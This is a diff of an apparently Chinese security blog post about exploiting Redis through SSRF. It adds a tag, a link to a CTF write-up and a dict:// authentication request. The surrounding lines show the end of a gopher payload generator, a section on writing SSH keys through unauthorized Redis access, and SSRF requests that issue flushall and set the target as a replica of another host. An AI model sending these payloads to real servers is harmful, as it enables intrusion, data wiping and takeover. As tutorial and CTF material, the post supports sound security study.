@@ -260,6 +260,11 @@
             
             <span class="tag">
                 
+                <a href="/blog/tags/SSRF/" style="color: #ffa2c4">SSRF</a>
+            </span>
+            
+            <span class="tag">
+                
                 <a href="/blog/tags/Redis/" style="color: #ff7d73">Redis</a>
             </span>
             
@@ -283,7 +288,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">9分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
     
@@ -353,6 +358,7 @@ payload<span class="token operator">=</span>protocol<span class="token operator"
         payload <span class="token operator">+=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token keyword">print</span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>具体攻击过程可参考：<a href="">ctfshow2025元旦渗透赛 第五章 功亏一篑</a></p>
 <hr>
 <h1 id="未授权访问写ssh公钥"><a href="#未授权访问写ssh公钥" class="headerlink" title="未授权访问写ssh公钥"></a>未授权访问写ssh公钥</h1><p>条件：</p>
 <ul>
@@ -569,6 +575,9 @@ exp_filename<span class="token operator">=</span><span class="token string">"exp
 </ul>
 <p>假设ssrf的点在ssrf.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span><span class="token keyword">var</span><span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/flushall </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>验证登录：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/auth:password</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>主从复制写入</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/slaveof:192.168.200.4:6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
